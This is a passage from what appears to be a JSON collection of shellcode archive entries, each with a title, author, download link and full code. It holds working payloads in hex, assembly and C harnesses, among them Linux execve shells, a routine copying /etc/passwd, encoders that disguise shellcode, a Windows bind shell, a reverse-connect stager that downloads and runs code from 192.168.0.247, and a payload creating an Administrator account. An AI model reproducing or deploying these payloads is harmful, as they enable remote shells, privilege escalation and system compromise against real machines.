"\"\\x31\\xc0\\xb0\\x02\\xcd\\x80\\x31\\xdb\\x39\\xd8\\x74\\x2a\\x31\\xc0\\xb0\\x07\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x50\\xb0\\x0f\\x6a\\x78\\x89\\xe3\\x31\\xc9\\x66\\xb9\\xff\\x01\\xcd\\x80\\x31\\xc0\\x50\\x6a\\x78\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68\\x32\\x2f\\x2f\\x78\\x68\\x32\\x2e\\x32\\x32\\x68\\x31\\x36\\x38\\x2e\\x68\\x31\\x39\\x32\\x2e\\x89\\xe1\\x52\\x6a\\x74\\x68\\x2f\\x77\\x67\\x65\\x68\\x2f\\x62\\x69\\x6e\\x68\\x2f\\x75\\x73\\x72\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "", "main()", "{", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Using jump/call/pop Shellcode (52 bytes)", "Author": "Paolo Stivanin", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-863.php", "View": null, "code": [";Description:  JMP-CALL-POP execve shell (52 bytes)", ";Shellcode:    \\xeb\\x25\\x5e\\x89\\xf7\\x31\\xc0\\x50\\x89\\xe2\\x50\\x83\\xc4\\x03\\x8d\\x76\\x04\\x33\\x06\\x50\\x31\\xc0\\x33\\x07\\x50\\x89\\xe3\\x31\\xc0\\x50\\x8d\\x3b\\x57\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xe8\\xd6\\xff\\xff\\xff\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68", ";Author:       Paolo Stivanin <https://github.com/polslinux>", ";SLAE ID:      526 ", "", "global _start", "", "section .text", "_start:", "    jmp short here", "", "me:", "    pop esi", "    mov edi,esi", "    ", "    xor eax,eax", "    push eax", "    mov edx,esp", "    ", "    push eax", "    add esp,3", "    lea esi,[esi +4]", "    xor eax,[esi]", "    push eax", "    xor eax,eax", "    xor eax,[edi]", "    push eax", "    mov ebx,esp ", "", "    xor eax,eax", "    push eax", "    lea edi,[ebx]", "    push edi", "    mov ecx,esp", "", "    mov al,0xb", "    int 0x80", "", "here:", "    call me", "    path db \"//bin/sh\""]},
{"Title": "Linux/x86 - Copy /etc/passwd to /tmp/outfile Shellcode (97 bytes)", "Author": "Paolo Stivanin", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-864.php", "View": null, "code": [";Description:   Copy /etc/passwd to /tmp/outfile (97 bytes)", ";Shellcode:     \\x31\\xc0\\xb0\\x05\\x31\\xc9\\x51\\x68\\x73\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\\x8d\\x5c\\x24\\x01\\xcd\\x80\\x89\\xc3\\xb0\\x03\\x89\\xe7\\x89\\xf9\\x66\\x6a\\xff\\x5a\\xcd\\x80\\x89\\xc6\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x66\\x69\\x6c\\x65\\x68\\x2f\\x6f\\x75\\x74\\x68\\x2f\\x74\\x6d\\x70\\x89\\xe3\\xb1\\x42\\x66\\x68\\xa4\\x01\\x5a\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x89\\xf9\\x89\\xf2\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb0\\x01\\xb3\\x05\\xcd\\x80", ";Author:        Paolo Stivanin <https://github.com/polslinux>", ";SLAE ID:       526 ", "", "global _start", "section .text", "_start:", "    xor eax,eax", "    mov al,0x5", "    xor ecx,ecx", "    push ecx", "    push 0x64777373 ", "    push 0x61702f63", "    push 0x74652f2f", "    lea ebx,[esp +1]", "    int 0x80", "", "    mov ebx,eax", "    mov al,0x3", "    mov edi,esp", "    mov ecx,edi", "    push WORD 0xffff", "    pop edx", "    int 0x80", "    mov esi,eax", "", "    push 0x5", "    pop eax", "    xor ecx,ecx", "    push ecx", "    push 0x656c6966", "    push 0x74756f2f", "    push 0x706d742f", "    mov ebx,esp", "    mov cl,0102o", "    push WORD 0644o", "    pop edx", "    int 0x80", "", "    mov ebx,eax", "    push 0x4", "    pop eax", "    mov ecx,edi", "    mov edx,esi", "    int 0x80", "", "    xor eax,eax", "    xor ebx,ebx", "    mov al,0x1", "    mov bl,0x5", "    int 0x80"]},
{"Title": "Linux/x86 - shift-bit execve() Encoder Shellcode (114 bytes)", "Author": "Shihao Song", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-868.php", "View": null, "code": [";author: Shihao Songss3695@drexel.edu", ";decoding will be divided into two parts", ";First, shift right to get the original shellcode with prefix \"0xAA\"", ";Second, delete all the \"0xAA\" prefix and reformat the shellcode", "", "; shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")", "; encode = \"\"", "; ", "; for x in bytearray(shellcode) :", ";     if x < 128:", ";         x=x<<1      ", ";         encode += '0xAA,'", ";     encode += '0x'", ";     encode += '%02x,'%x", "; ", "; print encode", "", "global _start", "section .text", "_start:", "", "jmp short call_shellcode", "", "decoder:", "", "pop esi             ;now esi contains the address of encoded shellcode", "mov edi, esi        ;this is for formatting", "", "decode:", "mov bl, byte [esi]", "xor bl, 0xBB        ;bl is for testing end", "jz formatting       ;First step is done", "", "mov cl, byte [esi]", "xor cl, 0XAA", "jz shift_decode", "inc esi", "jmp short decode", "", "", "shift_decode:", "mov dl, byte [esi + 1]", "shr dl,1            ;shift next instruction", "mov byte [esi + 1], dl", "inc esi", "jmp short decode", "", "formatting:", "mov eax, edi", "mov bl, byte [eax]", "xor bl, 0xBB        ;now formatting complete", "jz encoded          ;starts to execute", "format:", "mov bl, byte [eax]  ;bl is for testing end", "mov cl, byte [eax]  ;cl is for testing prefix", "xor cl, 0xAA", "jnz Next_Cycle", "", "Cycle:", "mov dl, byte [eax]", "xor dl, 0xBB", "jz Next_Cycle       ;This cycle ends here", "mov dl, byte [eax + 1]", "mov byte [eax], dl", "inc eax", "jmp short Cycle", "", "Next_Cycle:", "inc edi", "jmp short formatting", "", "call_shellcode:", "", "call decoder", "encoded: db 0xAA,0x62,0xc0,0xAA,0xa0,0xAA,0xd0,0xAA,0x5e,0xAA,0x5e,0xAA,0xe6,0xAA,0xd0,0xAA,0xd0,0xAA,0x5e,0xAA,0xc4,0xAA,0xd2,0xAA,0xdc,0x89,0xe3,0xAA,0xa0,0x89,0xe2,0xAA,0xa6,0x89,0xe1,0xb0,0xAA,0x16,0xcd,0x80,0xBB"]},
{"Title": "Linux/x86 - execve() Using JMP-FSTENV Shellcode (67 bytes)", "Author": "Paolo Stivanin", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-869.php", "View": null, "code": [";Description:   JMP-FSTENV execve shell (67 bytes)", ";Shellcode:     \\xd9\\xee\\xeb\\x34\\xeb\\x25\\x5e\\x89\\xf7\\x31\\xc0\\x50\\x89\\xe2\\x50\\x83\\xc4\\x03\\x8d\\x76\\x04\\x33\\x06\\x50\\x31\\xc0\\x33\\x07\\x50\\x89\\xe3\\x31\\xc0\\x50\\x8d\\x3b\\x57\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xe8\\xd6\\xff\\xff\\xff\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x9b\\xd9\\x74\\x24\\xf4\\x59\\x8d\\x41\\x04\\xff\\xe0", ";Author:        Paolo Stivanin <https://github.com/polslinux>", ";SLAE ID:       526", "", "global main", "section .text", "main:", "    fldz", "    jmp short here", "message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68", "here:   fstenv [esp-0xc]", "    pop ecx", "    lea eax,[ecx+4]", "    jmp eax"]},
{"Title": "Linux/x86 - execve() + ROT-7 Shellcode (Encoder/Decoder) (74 bytes)", "Author": "Stavros Metzidakis", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-900.php", "View": null, "code": ["/*", "", " ROT-7 Decoder Shellcode - Linux Intel/x86", " Author: Stavros Metzidakis", "", "*/", "", "", "a) Python ROT-7 encoder for shellcode (execve-stack)", "---------------------------------------------------------------------------------------", "#!/usr/bin/python", "", "# Python ROT-7 Encoder", "", "shellcode = (\"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")", "", "encoded = \"\"", "encoded2 = \"\"", "", "print 'Encoded shellcode ...'", "", "for x in bytearray(shellcode) :", "# boundary is computed as 255-ROT(x) where x, the amount to rotate by", "    if x > 248:", "        encoded += '\\\\x'", "        encoded += '%02x' %(7 -(256 - x))", "        encoded2 += '0x'", "        encoded2 += '%02x,' %(7 -(256 - x))", "    else:", "        encoded += '\\\\x'", "        encoded += '%02x'%(x+7)", "        encoded2 += '0x'", "        encoded2 += '%02x,' %(x+7)", "    ", "", "print encoded", "", "print encoded2", "", "print 'Len: %d' % len(bytearray(shellcode))", "---------------------------------------------------------------------------------------", "Test run:", "$ ./rot-7-encoder.py", "Encoded shellcode ...", "\\x38\\xc7\\x57\\x6f\\x69\\x68\\x7a\\x6f\\x6f\\x69\\x70\\x75\\x36\\x6f\\x36\\x36\\x36\\x36\\x90\\xea\\x57\\x90\\xe9\\x5a\\x90\\xe8\\xb7\\x12\\xd4\\x87", "0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87,", "Len: 30", "", "", "", "", "b) Decoder for a ROT-7 encoded shellcode (execve-stack)", "---------------------------------------------------------------------------------------", "$objdump -d rot-7-decoder -M intel ", "", "rot-7-decoder:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060:   eb 25                   jmp    8048087 <call_decoder>", "", "08048062 <decoder>:", " 8048062:   5e                      pop    esi", " 8048063:   31 c9                   xor    ecx,ecx", " 8048065:   b1 1e                   mov    cl,0x1e              ;ROTed shellcode length goes here", "", "08048067 <decode>:", " 8048067:   80 3e 07                cmp    BYTE PTR [esi],0x7", " 804806a:   7c 05                   jl     8048071 <lowbound>", " 804806c:   80 2e 07                sub    BYTE PTR [esi],0x7", " 804806f:   eb 11                   jmp    8048082 <common_commands>", "", "08048071 <lowbound>:", " 8048071:   31 db                   xor    ebx,ebx", " 8048073:   31 d2                   xor    edx,edx", " 8048075:   b3 07                   mov    bl,0x7", " 8048077:   b2 ff                   mov    dl,0xff", " 8048079:   66 42                   inc    dx", " 804807b:   2a 1e                   sub    bl,BYTE PTR [esi]", " 804807d:   66 29 da                sub    dx,bx", " 8048080:   88 16                   mov    BYTE PTR [esi],dl", "", "08048082 <common_commands>:", " 8048082:   46                      inc    esi", " 8048083:   e2 e2                   loop   8048067 <decode>", " 8048085:   eb 05                   jmp    804808c <Shellcode>", "", "08048087 <call_decoder>:", " 8048087:   e8 d6 ff ff ff          call   8048062 <decoder>", "", "0804808c <Shellcode>:                               ;ROTed shellcode", " 804808c:   38 c7                   cmp    bh,al", " 804808e:   57                      push   edi", " 804808f:   6f                      outs   dx,DWORD PTR ds:[esi]", " 8048090:   69 68 7a 6f 6f 69 70    imul   ebp,DWORD PTR [eax+0x7a],0x70696f6f", " 8048097:   75 36                   jne    80480cf <Shellcode+0x43>", " 8048099:   6f                      outs   dx,DWORD PTR ds:[esi]", " 804809a:   36                      ss", " 804809b:   36                      ss", " 804809c:   36                      ss", " 804809d:   36                      ss", " 804809e:   90                      nop", " 804809f:   ea 57 90 e9 5a 90 e8    jmp    0xe890:0x5ae99057", " 80480a6:   b7 12                   mov    bh,0x12", " 80480a8:   d4 87                   aam    0x87", "---------------------------------------------------------------------------------------", "", "", "$ cat shellcode.c", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \"\\xeb\\x25\\x5e\\x31\\xc9\\xb1\\x1e\\x80\\x3e\\x07\\x7c\\x05\\x80\\x2e\\x07\\xeb\\x11\\x31\\xdb\\x31\\xd2\\xb3\\x07\\xb2\\xff\\x66\\x42\\x2a\\x1e\\x66\\x29\\xda\\x88\\x16\\x46\\xe2\\xe2\\xeb\\x05\\xe8\\xd6\\xff\\xff\\xff\\x38\\xc7\\x57\\x6f\\x69\\x68\\x7a\\x6f\\x6f\\x69\\x70\\x75\\x36\\x6f\\x36\\x36\\x36\\x36\\x90\\xea\\x57\\x90\\xe9\\x5a\\x90\\xe8\\xb7\\x12\\xd4\\x87\";", "", "main()", "{", "", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "    int (*ret)() = (int(*)())code;", "", "    ret();", "", "}", "", "", "$ gcc ./shellcode.c -fno-stack-protector -z execstack -o shellcode", "$ ./shellcode", "Shellcode Length:  74", "$"]},
{"Title": "Windows/x86 (NT/XP/2000/2003) - Bind (8721/TCP) Shell Shellcode (356 bytes)", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-173.php", "View": null, "code": [";      Title:  Win32 Bind Shell", ";  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003", ";   Function:  Listen for connection and spawn command shell", ";     Author:  hdm[at]metasploit.com", "", "; Compile: nasm -f bin -o win32_bind.bin win32_bind.asm", "", "", "[BITS 32]", "", "global _start", "", "_start:", "", "LCaller:", "    call LLoadFunctions", "", "LDataSegment:", ";========================", "", "dd \"CMD\"", "", "dd 0x79c679e7 ; closesocket             12", "dd 0x498649e5 ; accept                  16", "dd 0xe92eada4 ; listen                  20", "dd 0xc7701aa4 ; bind                    24", "dd 0xadf509d9 ; WSASocketA              28", "dd 0x3bfcedcb ; WSAStartup              32", "", "dd 0xec0e4e8e ; LoadLibraryA            36", "dd 0x73e2d87e ; ExitProcess             40", "dd 0xce05d9ad ; WaitForSingleObject     44", "dd 0x16b3fe72 ; CreateProcessA          48", "", "db \"WS2_32.DLL\", 0x00, 0x01", ";========================", "", "LLoadFunctions:\t", "    pop ebx  ", "    push esp", "\tmov ebp, esp ", "    mov [ebp], ebx", "", "LKernel32Base:", "    push byte 0x30", "    pop ecx", "    mov eax, [fs:ecx]", "\tmov eax, [eax + 0x0c] ", "\tmov esi, [eax + 0x1c] ", "\tlodsd\t\t\t\t  ", "\tmov ebx, [eax + 0x08] ", "    jmp short LStartLoading", "", "LLoadWinsock:", "    lea edx, [edi + 44] ; get address of ws2_32.dll", "    push ecx            ; save counter", "    push edx            ; push address of ws2_32.dll", "\tcall eax            ; LoadLibraryA()", "    mov ebx, eax        ; save module handle ", "    pop ecx             ; restore counter", "    jmp short Looper2", "    ", "LStartLoading:", "    ; Start loading addresses at ebp + 12", "    push byte 0x08", "    pop esi", "    add esi, ebp ", "", "    ; Function counter", "    push byte 0x0a", "    pop ecx", "    mov edi, [ebp]", "    ", "Looper:", "    cmp cl, 0x06", "    je short LLoadWinsock", "", "Looper2:    ", "    push ecx                    ; save the counter", "    push ebx                    ; dll handle", "    push dword [edi + ecx*4]    ; function hash value", "    call LGetProcAddress        ; find the address", "    pop ecx                     ; restore the counter", "    mov [esi + ecx * 4], eax    ; stack segment to store addresses", "    loop Looper", "\txor edi, edi", "", "LWSAStartup:", "\t; WSAStartup(0x101, DATA) ", "    sub sp, 400", "\tpush esp", "\tpush 0x101", "\tcall [ebp + 32]", "", "LWSASocketA:", "\t; WSASocketA(2,1,0,0,0,0) ", "\tpush edi", "\tpush edi", "\tpush edi", "\tpush edi", "\tinc edi", "\tpush edi", "\tinc edi", "\tpush edi", "\tcall [ebp + 28]", "\tmov ebx, eax                ; save socket to ebx", "    xor edi, edi", "    ", "LBind:", "\tpush edi", "\tpush edi", "\tpush dword 0x11220002 ; port 8721", "\tmov esi, esp", "\tpush byte 0x10        ; length", "\tpush esi", "\tpush ebx", "\tcall [ebp + 24]", "", "LListen:", "\tpush edi", "\tpush ebx", "\tcall [ebp + 20]", "", "LAccept:", "\tpush edi", "\tpush esi", "\tpush ebx", "\tcall [ebp + 16]", "\tmov edx, eax", "", "LCreateProcessStructs:", "\t; allocate space for STARTUPINFO, PROCESS_INFORMATION ", "\tsub sp, 0x54", "", "\t; zero out SI/PI ", "\tlea edi, [esp]", "\txor eax, eax", "    push byte 21", "    pop ecx", "    ", "LBZero:", "\trep stosd", "    ", "    mov edi, edx", "\tmov byte [esp + 16], 68\t ; si.cb = sizeof(si) ", "\tinc byte [esp + 61]\t\t ; si.dwFlags = 0x100 ", "", "\t; socket handles ", "\tmov [esp + 16 + 56], edi", "\tmov [esp + 16 + 60], edi", "\tmov [esp + 16 + 64], edi", "", "\tlea eax, [esp + 16]\t; si ", "\tpush esp\t\t\t; pi ", "\tpush eax", "\tpush ecx", "\tpush ecx", "\tpush ecx", "    ", "    inc ecx", "\tpush ecx", "    dec ecx", "    ", "\tpush ecx", "\tpush ecx", "\tpush dword [ebp]", "\tpush ecx", "", "LCreateProcess:", "\tcall [ebp + 48]", "\tmov ecx, esp", "    ", "LWaitForSingleObject:", "    push 0xFFFFFFFF", "    push dword [ecx]", "    call [ebp + 44]", "", "LCloseSocket:", "    push edi", "    call [ebp + 12]", "", "LFinished:", "    call [ebp + 40]", "  ", "LGetProcAddress:", "\tpush ebx", "\tpush ebp", "\tpush esi", "\tpush edi", "\tmov ebp, [esp + 24]\t\t\t", "\tmov eax, [ebp + 0x3c]\t\t", "\tmov edx, [ebp + eax + 120]", "\tadd edx, ebp\t\t\t\t", "\tmov ecx, [edx + 24]\t\t\t", "\tmov ebx, [edx + 32]", "\tadd ebx, ebp", "", "LFnlp:", "", "\tjecxz\tLNtfnd", "\tdec ecx", "\tmov esi, [ebx + ecx * 4]", "\tadd esi, ebp\t\t\t\t", "\txor edi, edi", "\tcld", "", "LHshlp:", "", "\txor eax, eax", "\tlodsb", "\tcmp al, ah", "\tje LFnd", "\tror edi, 13", "\tadd edi, eax", "\tjmp short LHshlp", "", "LFnd:", "\t", "\tcmp edi, [esp + 20]", "\tjnz LFnlp", "\tmov ebx, [edx + 36]\t\t\t", "\tadd ebx, ebp", "\tmov cx, [ebx + 2 * ecx]\t\t", "\tmov ebx, [edx + 28]\t\t\t", "\tadd ebx, ebp", "\tmov eax, [ebx + 4 * ecx]\t", "\tadd eax, ebp", "\tjmp short LDone", "", "LNtfnd:", "\txor eax, eax", "", "LDone:", "\tmov edx, ebp", "\tpop edi", "\tpop esi", "\tpop ebp", "\tpop ebx", "\tret 8"]},
{"Title": "Windows/x86 (2000) - Reverse (192.168.0.247:8721/TCP) Connect + Vampiric Import Shellcode (179 bytes)", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-174.php", "View": null, "code": [";      Title:  Windows 2000 Vampiric Import Reverse Connect", ";  Platforms:  Windows 2000", ";   Function:  Attach to dbmssocn.dll, use IAT to connect, read/exec payload", ";     Author:  hdm[at]metasploit.com", "", "; Compile: nasm -f bin -o win2000_vampiric_connector.bin win2000_vampiric_connector.asm", "", "", "[BITS 32]", "", "%define ESIMOD add si, 0x3000", "%define DBMSSOCN_WSAStartup [esi + 0x6C]", "%define DBMSSOCN_connect    [esi + 0x4C]", "%define DBMSSOCN_recv       [esi + 0x54]", "%define DBMSSOCN_send       [esi + 0x5C]", "%define DBMSSOCN_socket     [esi + 0x74]", "", "; uncomment this for better error handling and persistent reconnects", "; %define NICE", "", "global _start", "_start:", "", "LKernel32Base:", "    push byte 0x30", "    pop ecx", "    mov eax, [fs:ecx]", "    mov eax, [eax + 0x0c] ", "    mov esi, [eax + 0x1c] ", "    lodsd\t\t\t\t  ", "    mov ebp, [eax + 0x08] ", "", "    mov eax, [ebp + 0x3c]           ", "    mov edx, [ebp + eax + 120]", "    add edx, ebp                            ", "    mov ecx, [edx + 24]                     ", "    mov ebx, [edx + 32]", "    add ebx, ebp", "", "LFinderLoop:", "", "%ifdef NICE", "    jecxz LNotFound", "%endif", "", "    dec ecx", "    mov esi, [ebx + ecx * 4]", "    add esi, ebp                            ", "    xor edi, edi    ", "    cld", "", "LHasher:", "    xor eax, eax", "    lodsb", "    cmp al, ah", "    je short LFound", "    ror edi, 13", "    add edi, eax", "    jmp short LHasher", "", "LFound:      ", "    cmp edi, 0xec0e4e8e     ; LoadLibraryA", "    jnz short LFinderLoop", "    mov ebx, [edx + 36]                     ", "    add ebx, ebp", "    mov cx, [ebx + 2 * ecx]         ", "    mov ebx, [edx + 28]                     ", "    add ebx, ebp", "    mov eax, [ebx + 4 * ecx]        ", "    add eax, ebp", "    jmp short LFinderDone", "", "%ifdef NICE", "LNotFound:", "    xor eax, eax", "%endif ", "", "LFinderDone:", "    call LoadDBMSSOCN", "", "LDataSegment:", ";========================", "db \"DBMSSOCN.DLL\"", "db 0x00, 0xFF               ; second byte only added for easy disasm", ";========================", "", "LoadDBMSSOCN:                         ", "\tcall eax                ; LoadLibraryA (ptr to dll on stack)", "    mov esi, eax            ; esi used by all DBMSSOCN functions", "    ESIMOD                  ; inc base to save space on the calls", "    xor edi, edi            ; edi is just a null", "    ", "LWSAStartup:", "    sub sp, 400", "\tpush esp", "\tpush dword 0x101", "\tcall DBMSSOCN_WSAStartup", "", "LSocket:", "\tpush edi", "\tpush edi", "\tpush edi", "\tpush edi", "\tinc edi", "\tpush edi", "\tinc edi", "\tpush edi", "\tcall DBMSSOCN_socket", "\tmov ebx, eax", "", "LConnect:", "    push 0xF700A8C0         ; host: 192.168.0.247", "    push 0x11220002         ; port: 8721     ", "\tmov ecx, esp", "\tpush byte 0x10", "\tpush ecx", "\tpush ebx", "\tcall DBMSSOCN_connect   ; set eax to 0 on success", "", "%ifdef NICE", "    test eax,eax", "    jnz LConnect", "    xor eax, eax", "%endif ", "        ", "LReadCodeFromSocket:", "    add di, 0xffe            ; read 4096 bytes of payload (edi == 2)", "    sub esp, edi", "    mov ebp, esp", "    push eax               ; flags", "    push edi               ; length", "    push ebp               ; buffer", "    push ebx               ; socket", "    call DBMSSOCN_recv     ; recv(socket, buffer, length, flags)", "    jmp esp                ; jump into new payload"]},
{"Title": "Windows/x86 - Create Administrator User (X) Shellcode (304 bytes)", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-175.php", "View": null, "code": [";      Title:  Win32Create Admin User Account", ";  Platforms:  Windows NT 4.0, Windows 2000, Windows XP", ";   Function:  NetUserAdd(X);  NetLocalGroupAddMembers(X, Administrators);", ";     Author:  hdm[at]metasploit.com", "", "", "[BITS 32]", "", "global _start", "", "_start:", "", "\tsub sp, 128", "    ", "\tmov esi, esp", "", "\t;\t[esi]", "\t;\t    00 kernel32.dll", "\t;\t\t04 netapi32.dll", "\t;\t\t08 LoadLibraryA", "\t;\t\t12 ExitProcess", "\t;\t\t16 NetUserAdd", "\t;\t\t20 NetLocalGroupAddMembers", "\t;\t\t24 user/pass", "\t;\t\t28 group", "\t", "", "    ; get base kernel32 address", "\tcall LK32Base", "\tmov [esi], eax", "    mov ebx, eax", "    ", "\t; GetProcAddress(ExitProcess)", "\tpush ebx", "\tpush 0x73e2d87e", "\tcall LGetProcAddress", "\tmov [esi + 12], eax", "    ", "    ; GetProcAddress(LoadLibraryA)", "    push ebx", "\tpush 0xec0e4e8e", "\tcall LGetProcAddress", "\tmov [esi + 8], eax", "", "\t; LoadLibrary(netapi32.dll)", "\txor ebx, ebx", "\tpush\tebx", "\tpush\t0x32336970", "\tpush\t0x6174656e", "\tpush\tesp", "\tcall\teax", "\tmov [esi + 4], eax", "    mov ebx, eax", "", "\t; GetProcAddress(NetUserAdd)", "\tpush ebx", "\tpush 0xcd7cdf5e", "\tcall LGetProcAddress", "\tmov [esi + 16], eax", "", "\t; GetProcAddress(NetLocalGroupAddMembers)", "\tpush ebx", "\tpush  0xc30c3dd7", "\tcall LGetProcAddress", "\tmov [esi + 20], eax", "", "    ; useful register values", "\txor eax, eax", "\txor ebx, ebx", "\tinc ebx", "\t", "    ; push the group (Administrators)", "\tpush eax", "\tpush 0x00730072", "\tpush 0x006f0074", "\tpush 0x00610072", "\tpush 0x00740073", "\tpush 0x0069006e", "\tpush 0x0069006d", "\tpush 0x00640041", "\tmov [esi + 28], esp", "", "\t; push the username (X)", "\tpush eax", "\tpush 0x00000058", "\tmov\t ecx, esp", "\tmov [esi + 24], ecx ", "", "    ; add the \\ to the username", "\tpush 0x005c0000", "", "    ; create the NetUserAdd arguments", "\tpush eax", "\tpush ebx", "\tpush eax", "\tpush eax", "\tpush ebx", "\tpush eax", "\tpush ecx", "\tpush ecx", "\tmov ecx, esp ", "", "\tpush eax", "\tpush esp\t", "\tpush ecx\t", "\tpush ebx\t", "\tpush eax", "    ", "    ; call NetUserAdd(X)", "\tcall [esi + 16]", "", "    ; create the NetLocalGroupAddMembers arguments", "\tmov ecx, [esi + 24]", "\tdec ecx", "\tdec ecx", "\tpush ecx", "\tmov ecx, esp", "", "\tpush byte 1\t", "\tpush ecx\t\t\t", "\tpush byte 3\t", "\tpush dword [esi + 28]\t\t", "\tpush byte 0", "    ", "    ; call NetLocalGroupAddMembers", "\tcall [esi + 20]", "", "LFinished:", "\t", "\tcall [esi + 12]", "", "LK32Base:", "\tpush esi", "    push byte 0x30", "    pop ecx", "\tmov eax, [fs:ecx]", "\tmov eax, [eax + 0x0c] ", "\tmov esi, [eax + 0x1c] ", "\tlodsd\t\t\t\t  ", "\tmov eax, [eax + 0x08] ", "\tpop esi", "\tret 4", "    ", "LGetProcAddress:", "\t", "\tpush ebx", "\tpush ebp", "\tpush esi", "\tpush edi", "\tmov ebp, [esp + 24]\t\t\t", "\tmov eax, [ebp + 0x3c]\t\t", "\tmov edx, [ebp + eax + 120]", "\tadd edx, ebp\t\t\t\t", "\tmov ecx, [edx + 24]\t\t\t", "\tmov ebx, [edx + 32]", "\tadd ebx, ebp", "", "LFnlp:", "", "\tjecxz\tLNtfnd", "\tdec ecx", "\tmov esi, [ebx + ecx * 4]", "\tadd esi, ebp\t\t\t\t", "\txor edi, edi\t", "\tcld", "", "LHshlp:", "", "\txor eax, eax", "\tlodsb", "\tcmp al, ah", "\tje LFnd", "\tror edi, 13", "\tadd edi, eax", "\tjmp short LHshlp", "", "LFnd:", "\t", "\tcmp edi, [esp + 20]", "\tjnz LFnlp", "\tmov ebx, [edx + 36]\t\t\t", "\tadd ebx, ebp", "\tmov cx, [ebx + 2 * ecx]\t\t", "\tmov ebx, [edx + 28]\t\t\t", "\tadd ebx, ebp", "\tmov eax, [ebx + 4 * ecx]\t", "\tadd eax, ebp", "\tjmp short LDone", "", "LNtfnd:", "", "\txor eax, eax", "", "LDone:", "\tmov edx, ebp", "\tpop edi", "\tpop esi", "\tpop ebp", "\tpop ebx", "\tret 8"]},
{"Title": "Windows/x86 (XP SP3) (French) - Sleep 90 Seconds Shellcode (14 bytes)", "Author": "OpTix", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-494.php", "View": null, "code": ["/*", "win32/xp sp3 (FR) Sleep 14 bytes", "Author : optix hacker <aidi youssef>", "Mail : optix@9.cn", "notice Tested Under Windows XP SP3 (fr)", "this shellcode makes a sleep for 90000ms=90s=1,5min", "this is API from kernel32.dll for sleep :0x7C802446 in win32 xp sp3 (fr)", "assembly code is secret in this shellcode :)", "", "*/", "#include <stdio.h>", "unsigned char shellcode[] =\"\\x31\"", "", "\"\\xC0\\xB9\\x46\\x24\\x80\\x7C\\x66\\xB8\\x90\\x5F\\x50\\xFF\\xD1\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\\n\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}"]},
{"Title": "Windows/x86 (XP Professional SP2) (English) - Wordpad.exe Shellcode (15 bytes)", "Author": "Aodrulez", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-513.php", "View": null, "code": ["+-------------------------------------------------+", "", "| Windows XP Pro Sp2 English \"Wordpad\" Shellcode. |", "", "+-------------------------------------------------+", "", "", "Size  : 15 Bytes.", "Author: Aodrulez. ", "Email : f3arm3d3ar@gmail.com", "", "", "Shellcode = \"\\x6A\\x05\\x68\\x97\\x4C\\x80\\x7C\\xB8\"", "            \"\\x4D\\x11\\x86\\x7C\\xFF\\xD0\\xCC\";", "", "", "+-----------+", "", "| Asm Code: |", "", "+-----------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "start:", "      push 5", "\tpush 7c804c97h    ;addr of \"write\" string in 